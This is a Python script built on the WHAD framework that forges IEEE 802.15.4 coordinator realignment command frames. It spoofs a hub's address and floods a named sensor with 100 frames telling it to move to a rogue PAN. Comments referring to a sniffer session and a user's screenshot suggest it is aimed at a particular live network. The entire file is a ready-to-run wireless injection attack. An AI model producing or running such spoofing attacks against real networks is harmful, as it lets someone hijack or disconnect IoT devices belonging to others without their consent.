from whad.device import WhadDevice
from whad.dot15d4.connector import Dot15d4
import struct
import time

# 1. Hardware Initialization
dev = WhadDevice.create("uart0")
connector = Dot15d4(dev)

# 2. Parameters from Latest Sniffer Session
LEGIT_PAN = 0xc719
ROGUE_PAN = 0xdead
HUB_IEEE = bytes.fromhex("00124b0039de036e") # Coordinator IEEE

# UPDATED: Using the current address from your 3:12 PM screenshot
TARGET_SENSOR = 0x1df4 

def inject_realignment_attack(seq):
    # --- MAC Command 0x07 Payload ---
    # ID(0x07) + RoguePAN(LE) + CoordShort(0x0000) + Channel(11) + NodeShort(0x1DF4)
    payload = b"\x07" + struct.pack("<H", ROGUE_PAN) + b"\x00\x00" + b"\x0b" + struct.pack("<H", TARGET_SENSOR)

    # --- MAC Header Construction ---
    # FCF: 0x23c8 (Command, AckReq, DestShort, SrcLong)
    mac_fcf = b"\x23\xc8" 
    mac_seq = struct.pack("B", seq)
    # Addressing: DestPAN + DestAddr + SrcPAN + SrcAddr(IEEE)
    addr_fields = struct.pack("<H", LEGIT_PAN) + struct.pack("<H", TARGET_SENSOR) + \
                  struct.pack("<H", LEGIT_PAN) + HUB_IEEE[::-1]
    
    full_packet = mac_fcf + mac_seq + addr_fields + payload
    
    print(f"[*] Injecting Realignment (Seq: {seq}) to Sensor {hex(TARGET_SENSOR)}")
    connector.send(full_packet)

try:
    print("[!] WATCH WIRESHARK. TRIGGER ATTACK AS SOON AS SENSOR (0x1df4) SENDS DATA!")
    # Send a continuous barrage to catch the wake-up window
    for i in range(100):
        inject_realignment_attack((200 + i) % 256)
        time.sleep(0.01) # 10ms spacing
finally:
    dev.close()
    print("[!] Finished. Check if sensor 0x1df4 begins sending Beacon Requests.")